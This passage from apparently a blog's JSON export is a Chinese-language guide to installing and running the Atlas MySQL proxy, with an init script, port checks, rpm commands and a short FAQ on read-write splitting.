class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x7F16;&#x5199;&#x7B80;&#x5355;&#x7684;Atlas&#x542F;&#x52A8;&#x811A;&#x672C;</span></span><br><span class=\"line\">vim /etc/init.d/atlas</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#!/bin/sh  </span><br><span class=\"line\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">start</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /usr/<span class=\"built_in\">local</span>/mysql-proxy/bin/mysql-proxyd <span class=\"built_in\">test</span> start</span><br><span class=\"line\">}  </span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">stop</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /usr/<span class=\"built_in\">local</span>/mysql-proxy/bin/mysql-proxyd <span class=\"built_in\">test</span> stop</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">status</span></span>()  </span><br><span class=\"line\">{       </span><br><span class=\"line\">        /usr/<span class=\"built_in\">local</span>/mysql-proxy/bin/mysql-proxyd <span class=\"built_in\">test</span> status  </span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">restart</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /usr/<span class=\"built_in\">local</span>/mysql-proxy/bin/mysql-proxyd <span class=\"built_in\">test</span> restart</span><br><span class=\"line\">} </span><br><span class=\"line\">ATLAS=<span class=\"string\">&quot;/usr/local/mysql-proxy/bin/mysql-proxyd&quot;</span>  </span><br><span class=\"line\">[ <span class=\"_\">-f</span> <span class=\"variable\">$ATLAS</span> ] || <span class=\"built_in\">exit</span> 1  </span><br><span class=\"line\"><span class=\"comment\"># See how we were called.  </span></span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&quot;<span class=\"variable\">$1</span>&quot;</span> <span class=\"keyword\">in</span>  </span><br><span class=\"line\">        start)  </span><br><span class=\"line\">                start  </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        stop)  </span><br><span class=\"line\">                stop  </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        restart)  </span><br><span class=\"line\">                restart</span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        status)  </span><br><span class=\"line\">                status </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">                <span class=\"comment\"># stop    sleep 3   start  ;;  </span></span><br><span class=\"line\">        *)  </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> $<span class=\"string\">&quot;Usage: <span class=\"variable\">$0</span> {start|stop|status|restart}&quot;</span>  </span><br><span class=\"line\">                <span class=\"built_in\">exit</span> 1  </span><br><span class=\"line\"><span class=\"keyword\">esac</span>  </span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0 </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># atlas&#x670D;&#x52A1;&#x9A8C;&#x8BC1;</span></span><br><span class=\"line\">service atlas status</span><br><span class=\"line\">service atlas start</span><br><span class=\"line\">service atlas restart</span><br><span class=\"line\">service atlas stop</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x67E5;&#x770B;MySQL&#x76D1;&#x542C;&#x7AEF;&#x53E3;\"><a href=\"#&#x67E5;&#x770B;MySQL&#x76D1;&#x542C;&#x7AEF;&#x53E3;\" class=\"headerlink\" title=\"&#x67E5;&#x770B;MySQL&#x76D1;&#x542C;&#x7AEF;&#x53E3;\"></a>&#x67E5;&#x770B;MySQL&#x76D1;&#x542C;&#x7AEF;&#x53E3;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">etstat -tanlp | grep mysql</span><br><span class=\"line\">tcp        0      0 0.0.0.0:2345            0.0.0.0:*               LISTEN      21449/mysql-proxy   </span><br><span class=\"line\">tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      24096/mysqld        </span><br><span class=\"line\">tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      21449/mysql-proxy</span><br></pre></td></tr></table></figure>\n<h3 id=\"Atlas&#x5B89;&#x88C5;&#x53CA;&#x5378;&#x8F7D;\"><a href=\"#Atlas&#x5B89;&#x88C5;&#x53CA;&#x5378;&#x8F7D;\" class=\"headerlink\" title=\"Atlas&#x5B89;&#x88C5;&#x53CA;&#x5378;&#x8F7D;\"></a>Atlas&#x5B89;&#x88C5;&#x53CA;&#x5378;&#x8F7D;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x5B89;&#x88C5;</span></span><br><span class=\"line\">sudo rpm -i Atlas-2.2.1.el6.x86_64.rpm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5378;&#x8F7D;</span></span><br><span class=\"line\">sudo rpm <span class=\"_\">-e</span> Atlas-2.2.1.el6.x86_64</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x7CFB;&#x5217;&#x95EE;&#x9898;\"><a href=\"#&#x7CFB;&#x5217;&#x95EE;&#x9898;\" class=\"headerlink\" title=\"&#x7CFB;&#x5217;&#x95EE;&#x9898;\"></a>&#x7CFB;&#x5217;&#x95EE;&#x9898;</h3><p><strong>&#x95EE;&#x9898;&#xFF1A;atlas&#x5B89;&#x88C5;&#x540E;&#xFF0C;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8BFB;&#x4E00;&#x76F4;&#x8D70;&#x4E3B;&#x5E93; </strong><br>&#x56DE;&#x7B54;&#xFF1A;&#x6709;&#x4E8B;&#x52A1;&#x5B58;&#x5728;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4F1A;&#x5F3A;&#x5236;&#x8D70;&#x4E3B;&#x5E93;&#x3002;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF0C;&#x6DFB;&#x52A0;&#x6CE8;&#x89E3;[@Transactional(propagation=Propagation.NOT_SUPPORTED)];<br>&#x82E5;&#x4E0D;&#x6D89;&#x53CA;&#x4E8B;&#x52A1;&#xFF0C;&#x68C0;&#x67E5;&#x4E3B;&#x4ECE;&#x5E93;&#x7684;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x4E00;&#x81F4;&#xFF0C;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E3A;&#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF0C;&#x5E76;&#x6267;&#x884C;[FLUSH PRIVILEGES]&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x81EA;&#x6D4B;&#x6210;&#x529F;&#xFF0C;java&#x7A0B;&#x5E8F;&#x8FDE;&#x63A5;Atlas&#x540E;&#x5374;&#x4E0D;&#x80FD;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x8BF7;&#x6C42;&#x90FD;&#x53D1;&#x5411;&#x4E3B;&#x5E93;&#xFF0C;&#x8FD9;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#xFF1F;</strong><br>&#x56DE;&#x7B54;&#xFF1A;&#x68C0;&#x67E5;&#x4E00;&#x4E0B;java&#x6846;&#x67B6;&#xFF0C;&#x662F;&#x4E0D;&#x662F;&#x9ED8;&#x8BA4;&#x5C06;autocommit&#x8BBE;&#x7F6E;&#x4E3A;0&#x4E86;&#xFF0C;&#x5F88;&#x591A;java&#x6846;&#x67B6;&#x5C06;&#x8BED;&#x53E5;&#x90FD;&#x5C01;&#x88C5;&#x5728;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x4E2D;&#xFF0C;&#x800C;Atlas&#x4F1A;&#x5C06;&#x4E8B;&#x52A1;&#x8BF7;&#x6C42;&#x90FD;&#x53D1;&#x5411;&#x4E3B;&#x5E93;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;&#x6267;&#x884C;&#x76F8;&#x5173;&#x547D;&#x4EE4;&#xFF0C;&#x6210;&#x529F;&#x4E0A;&#x4E0B;&#x7EBF;&#x4ECE;&#x5E93;DB&#x540E;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x4ECE;&#x5E93;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x540C;&#x6B65;&#x4E3B;&#x5E93;&#x6570;&#x636E;</strong><br>&#x56DE;&#x7B54;&#xFF1A;atlas&#x662F;&#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x53EA;&#x662F;&#x63D0;&#x4F9B;&#x4E86;&#x8BBF;&#x95EE;&#x5C42;&#x7684;&#x4EE3;&#x7406;&#xFF0C;&#x4EE3;&#x7406;&#x548C;&#x4E3B;&#x4ECE;&#x6CA1;&#x6709;&#x5173;&#x7CFB;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E3B;&#x4ECE;&#x8FD8;&#x9700;&#x81EA;&#x5DF1;&#x914D;&#x7F6E;&#x3002;&#x800C;&#x4E0A;&#x4E0B;&#x7EBF;&#x4ECE;&#x5E93;DB&#xFF0C;&#x53EA;&#x662F;&#x8BF4;&#x8BFB;&#x7684;&#x8BF7;&#x6C42;&#x4E0D;&#x518D;&#x53D1;&#x5F80;&#x76F8;&#x5E94;&#x7684;&#x4ECE;&#x5E93;&#x4E86;&#xFF0C;&#x4E8B;&#x5148;&#x914D;&#x7F6E;&#x7684;&#x4E3B;&#x4ECE;&#x5173;&#x7CFB;&#x5E76;&#x4E0D;&#x4F1A;&#x6539;&#x53D8;&#x3002;&#x8FD8;&#x6709;&#x76EE;&#x524D;&#x7684;atlas&#x6682;&#x4E0D;&#x652F;&#x6301;&#x591A;&#x4E3B;&#x6A21;&#x5F0F;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Atlas&#x78B0;&#x5230;&#x89E3;&#x51B3;&#x4E0D;&#x4E86;&#x7684;&#x95EE;&#x9898;&#x600E;&#x4E48;&#x529E;&#xFF1F;</strong><br>&#x56DE;&#x7B54;&#xFF1A;&#x5C06;&#x76F8;&#x5173;&#x73AF;&#x5883;&#x3001;&#x6B65;&#x9AA4;&#x548C;&#x8FD0;&#x884C;&#x622A;&#x56FE;&#x53D1;&#x90AE;&#x4EF6;&#x81F3;zhuchao[AT]360.cn&#xFF0C;&#x6216;&#x8005;&#x52A0;QQ&#x7FA4;326544838&#x3002;&#x6211;&#x4E00;&#x95EE;&#x9898;&#x7EA0;&#x7ED3;&#x4E86;&#x51E0;&#x5C0F;&#x65F6;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#x4E86;&#xFF0C;&#x4E09;&#x5206;&#x949F;&#x540E;&#x5C31;&#x56DE;&#x590D;&#x6211;&#x4E86;&#xFF0C;&#x9707;&#x60CA;&#x4E86; (&#xAF;&#xFE43;&#xAF;)</p>\n<p>&#x66F4;&#x65B0;&#x4E2D;&#x3002;&#x3002;&#x3002;</p>\n","excerpt":"<h3 id=\"&#x7B80;&#x4ECB;\"><a href=\"#&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"&#x7B80;&#x4ECB;\"></a>&#x7B80;&#x4ECB;</h3><p>Atlas&#x662F;&#x7531; Qihoo 360&#x516C;&#x53F8;Web&#x5E73;&#x53F0;&#x90E8;&#x57FA;&#x7840;&#x67B6;&#x6784;&#x56E2;&#x961F;&#x5F00;&#x53D1;&#x7EF4;&#x62A4;&#x7684;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;MySQL&#x534F;&#x8BAE;&#x7684;&#x6570;&#x636E;&#x4E2D;&#x95F4;&#x5C42;&#x9879;&#x76EE;&#x3002;&#x5B83;&#x5728;MySQL&#x5B98;&#x65B9;&#x63A8;&#x51FA;&#x7684;MySQL-Proxy 0.8.2&#x7248;&#x672C;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;&#x5927;&#x91CF;bug&#xFF0C;&#x6DFB;&#x52A0;&#x4E86;&#x5F88;&#x591A;&#x529F;&#x80FD;&#x7279;&#x6027;&#x3002;&#x800C;&#x4E14;&#x5B89;&#x88C5;&#x65B9;&#x4FBF;&#x3002;&#x914D;&#x7F6E;&#x7684;&#x6CE8;&#x91CA;&#x5199;&#x7684;&#x86EE;&#x8BE6;&#x7EC6;&#x7684;&#xFF0C;&#x90FD;&#x662F;&#x4E2D;&#x6587;&#x3002;</p>\n<h3 id=\"&#x4E3B;&#x8981;&#x529F;&#x80FD;\"><a href=\"#&#x4E3B;&#x8981;&#x529F;&#x80FD;\" class=\"headerlink\" title=\"&#x4E3B;&#x8981;&#x529F;&#x80FD;\"></a>&#x4E3B;&#x8981;&#x529F;&#x80FD;</h3><ul>\n<li>&#x8BFB;&#x5199;&#x5206;&#x79BB;</li>\n<li>&#x4ECE;&#x5E93;&#x8D1F;&#x8F7D;&#x5747;&#x8861;</li>\n<li>IP&#x8FC7;&#x6EE4;</li>\n<li>&#x81EA;&#x52A8;&#x5206;&#x8868;</li>\n<li>DBA&#x53EF;&#x5E73;&#x6ED1;&#x4E0A;&#x4E0B;&#x7EBF;DB</li>\n<li>&#x81EA;&#x52A8;&#x6458;&#x9664;&#x5B95;&#x673A;&#x7684;DB</li>\n</ul>\n<h3 id=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>&#x76F8;&#x5173;&#x94FE;&#x63A5;</h3><p>Mysql&#x4E2D;&#x95F4;&#x4EF6;&#x4EA7;&#x54C1;&#x6BD4;&#x8F83;&#xFF1A;<a href=\"http://songwie.com/articlelist/44\">http://songwie.com/articlelist/44</a><br>Atlas&#x7684;&#x5B89;&#x88C5;&#xFF1A;<a href=\"https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x5B89;&#x88C5;\">https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x5B89;&#x88C5;</a><br>Atlas&#x529F;&#x80FD;&#x7279;&#x70B9;FAQ&#xFF1A;<a href=\"https://github.com/Qihoo360/Atlas/wiki/Atlas&#x529F;&#x80FD;&#x7279;&#x70B9;FAQ\">https://github.com/Qihoo360/Atlas/wiki/Atlas&#x529F;&#x80FD;&#x7279;&#x70B9;FAQ</a><br>Atlas&#x6027;&#x80FD;&#x7279;&#x70B9;&#xFF1A;<a href=\"https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;\">https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;</a><br>Atlas&#x67B6;&#x6784;&#xFF1A;<a href=\"https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x67B6;&#x6784;\">https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x67B6;&#x6784;</a><br>Atlas+Keepalived&#xFF1A;<a href=\"http://sofar.blog.51cto.com/353572/1601552\">http://sofar.blog.51cto.com/353572/1601552</a><br>Atlas&#x5404;&#x9879;&#x529F;&#x80FD;&#x9A8C;&#x8BC1;&#xFF1A;<a href=\"http://blog.itpub.net/27000195/viewspace-1421262/\">http://blog.itpub.net/27000195/viewspace-1421262/</a></p>","more":"<blockquote>\n<p>&#x5B98;&#x7F51;&#x6559;&#x7A0B;&#x5F88;&#x8BE6;&#x7EC6;&#xFF0C;&#x4E14;&#x662F;&#x4E2D;&#x6587;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x8FF0;&#x76F8;&#x5173;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x4E86;</p>\n</blockquote>\n<h3 id=\"&#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\"><a href=\"#&#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\" class=\"headerlink\" title=\"&#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\"></a>&#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;/usr/local/mysql-proxy/bin/mysql-proxyd test start&quot;</span> &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x6DFB;&#x52A0;atlas&#x670D;&#x52A1;\"><a href=\"#&#x6DFB;&#x52A0;atlas&#x670D;&#x52A1;\" class=\"headerlink\" title=\"&#x6DFB;&#x52A0;atlas&#x670D;&#x52A1;\"></a>&#x6DFB;&#x52A0;atlas&#x670D;&#x52A1;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x7F16;&#x5199;&#x7B80;&#x5355;&#x7684;Atlas&#x542F;&#x52A8;&#x811A;&#x672C;</span></span><br><span class=\"line\">vim /etc/init.d/atlas</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#!/bin/sh  </span><br><span class=\"line\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">start</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /usr/<span class=\"built_in\">local</span>/mysql-proxy/bin/mysql-proxyd <span class=\"built_in\">test</span> start</span><br><span class=\"line\">}  </span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">stop</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /usr/<span class=\"built_in\">local</span>/mysql-proxy/bin/mysql-proxyd <span class=\"built_in\">test</span> stop</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">status</span></span>()  </span><br><span class=\"line\">{       </span><br><span class=\"line\">        /usr/<span class=\"built_in\">local</span>/mysql-proxy/bin/mysql-proxyd <span class=\"built_in\">test</span> status  </span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">restart</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /usr/<span class=\"built_in\">local</span>/mysql-proxy/bin/mysql-proxyd <span class=\"built_in\">test</span> restart</span><br><span class=\"line\">} </span><br><span class=\"line\">ATLAS=<span class=\"string\">&quot;/usr/local/mysql-proxy/bin/mysql-proxyd&quot;</span>  </span><br><span class=\"line\">[ <span class=\"_\">-f</span> <span class=\"variable\">$ATLAS</span> ] || <span class=\"built_in\">exit</span> 1  </span><br><span class=\"line\"><span class=\"comment\"># See how we were called.  </span></span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&quot;<span class=\"variable\">$1</span>&quot;</span> <span class=\"keyword\">in</span>  </span><br><span class=\"line\">        start)  </span><br><span class=\"line\">                start  </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        stop)  </span><br><span class=\"line\">                stop  </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        restart)  </span><br><span class=\"line\">                restart</span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        status)  </span><br><span class=\"line\">                status </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">                <span class=\"comment\"># stop    sleep 3   start  ;;  </span></span><br><span class=\"line\">        *)  </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> $<span class=\"string\">&quot;Usage: <span class=\"variable\">$0</span> {start|stop|status|restart}&quot;</span>  </span><br><span class=\"line\">                <span class=\"built_in\">exit</span> 1  </span><br><span class=\"line\"><span class=\"keyword\">esac</span>  </span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0 </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># atlas&#x670D;&#x52A1;&#x9A8C;&#x8BC1;</span></span><br><span class=\"line\">service atlas status</span><br><span class=\"line\">service atlas start</span><br><span class=\"line\">service atlas restart</span><br><span class=\"line\">service atlas stop</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x67E5;&#x770B;MySQL&#x76D1;&#x542C;&#x7AEF;&#x53E3;\"><a href=\"#&#x67E5;&#x770B;MySQL&#x76D1;&#x542C;&#x7AEF;&#x53E3;\" class=\"headerlink\" title=\"&#x67E5;&#x770B;MySQL&#x76D1;&#x542C;&#x7AEF;&#x53E3;\"></a>&#x67E5;&#x770B;MySQL&#x76D1;&#x542C;&#x7AEF;&#x53E3;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">etstat -tanlp | grep mysql</span><br><span class=\"line\">tcp        0      0 0.0.0.0:2345            0.0.0.0:*               LISTEN      21449/mysql-proxy   </span><br><span class=\"line\">tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      24096/mysqld        </span><br><span class=\"line\">tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      21449/mysql-proxy</span><br></pre></td></tr></table></figure>\n<h3 id=\"Atlas&#x5B89;&#x88C5;&#x53CA;&#x5378;&#x8F7D;\"><a href=\"#Atlas&#x5B89;&#x88C5;&#x53CA;&#x5378;&#x8F7D;\" class=\"headerlink\" title=\"Atlas&#x5B89;&#x88C5;&#x53CA;&#x5378;&#x8F7D;\"></a>Atlas&#x5B89;&#x88C5;&#x53CA;&#x5378;&#x8F7D;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x5B89;&#x88C5;</span></span><br><span class=\"line\">sudo rpm -i Atlas-2.2.1.el6.x86_64.rpm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5378;&#x8F7D;</span></span><br><span class=\"line\">sudo rpm <span class=\"_\">-e</span> Atlas-2.2.1.el6.x86_64</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x7CFB;&#x5217;&#x95EE;&#x9898;\"><a href=\"#&#x7CFB;&#x5217;&#x95EE;&#x9898;\" class=\"headerlink\" title=\"&#x7CFB;&#x5217;&#x95EE;&#x9898;\"></a>&#x7CFB;&#x5217;&#x95EE;&#x9898;</h3><p><strong>&#x95EE;&#x9898;&#xFF1A;atlas&#x5B89;&#x88C5;&#x540E;&#xFF0C;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8BFB;&#x4E00;&#x76F4;&#x8D70;&#x4E3B;&#x5E93; </strong><br>&#x56DE;&#x7B54;&#xFF1A;&#x6709;&#x4E8B;&#x52A1;&#x5B58;&#x5728;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4F1A;&#x5F3A;&#x5236;&#x8D70;&#x4E3B;&#x5E93;&#x3002;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF0C;&#x6DFB;&#x52A0;&#x6CE8;&#x89E3;[@Transactional(propagation=Propagation.NOT_SUPPORTED)];<br>&#x82E5;&#x4E0D;&#x6D89;&#x53CA;&#x4E8B;&#x52A1;&#xFF0C;&#x68C0;&#x67E5;&#x4E3B;&#x4ECE;&#x5E93;&#x7684;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x4E00;&#x81F4;&#xFF0C;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E3A;&#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF0C;&#x5E76;&#x6267;&#x884C;[FLUSH PRIVILEGES]&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x81EA;&#x6D4B;&#x6210;&#x529F;&#xFF0C;java&#x7A0B;&#x5E8F;&#x8FDE;&#x63A5;Atlas&#x540E;&#x5374;&#x4E0D;&#x80FD;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x8BF7;&#x6C42;&#x90FD;&#x53D1;&#x5411;&#x4E3B;&#x5E93;&#xFF0C;&#x8FD9;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#xFF1F;</strong><br>&#x56DE;&#x7B54;&#xFF1A;&#x68C0;&#x67E5;&#x4E00;&#x4E0B;java&#x6846;&#x67B6;&#xFF0C;&#x662F;&#x4E0D;&#x662F;&#x9ED8;&#x8BA4;&#x5C06;autocommit&#x8BBE;&#x7F6E;&#x4E3A;0&#x4E86;&#xFF0C;&#x5F88;&#x591A;java&#x6846;&#x67B6;&#x5C06;&#x8BED;&#x53E5;&#x90FD;&#x5C01;&#x88C5;&#x5728;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x4E2D;&#xFF0C;&#x800C;Atlas&#x4F1A;&#x5C06;&#x4E8B;&#x52A1;&#x8BF7;&#x6C42;&#x90FD;&#x53D1;&#x5411;&#x4E3B;&#x5E93;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;&#x6267;&#x884C;&#x76F8;&#x5173;&#x547D;&#x4EE4;&#xFF0C;&#x6210;&#x529F;&#x4E0A;&#x4E0B;&#x7EBF;&#x4ECE;&#x5E93;DB&#x540E;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x4ECE;&#x5E93;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x540C;&#x6B65;&#x4E3B;&#x5E93;&#x6570;&#x636E;</strong><br>&#x56DE;&#x7B54;&#xFF1A;atlas&#x662F;&#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x53EA;&#x662F;&#x63D0;&#x4F9B;&#x4E86;&#x8BBF;&#x95EE;&#x5C42;&#x7684;&#x4EE3;&#x7406;&#xFF0C;&#x4EE3;&#x7406;&#x548C;&#x4E3B;&#x4ECE;&#x6CA1;&#x6709;&#x5173;&#x7CFB;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E3B;&#x4ECE;&#x8FD8;&#x9700;&#x81EA;&#x5DF1;&#x914D;&#x7F6E;&#x3002;&#x800C;&#x4E0A;&#x4E0B;&#x7EBF;&#x4ECE;&#x5E93;DB&#xFF0C;&#x53EA;&#x662F;&#x8BF4;&#x8BFB;&#x7684;&#x8BF7;&#x6C42;&#x4E0D;&#x518D;&#x53D1;&#x5F80;&#x76F8;&#x5E94;&#x7684;&#x4ECE;&#x5E93;&#x4E86;&#xFF0C;&#x4E8B;&#x5148;&#x914D;&#x7F6E;&#x7684;&#x4E3B;&#x4ECE;&#x5173;&#x7CFB;&#x5E76;&#x4E0D;&#x4F1A;&#x6539;&#x53D8;&#x3002;&#x8FD8;&#x6709;&#x76EE;&#x524D;&#x7684;atlas&#x6682;&#x4E0D;&#x652F;&#x6301;&#x591A;&#x4E3B;&#x6A21;&#x5F0F;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Atlas&#x78B0;&#x5230;&#x89E3;&#x51B3;&#x4E0D;&#x4E86;&#x7684;&#x95EE;&#x9898;&#x600E;&#x4E48;&#x529E;&#xFF1F;</strong><br>&#x56DE;&#x7B54;&#xFF1A;&#x5C06;&#x76F8;&#x5173;&#x73AF;&#x5883;&#x3001;&#x6B65;&#x9AA4;&#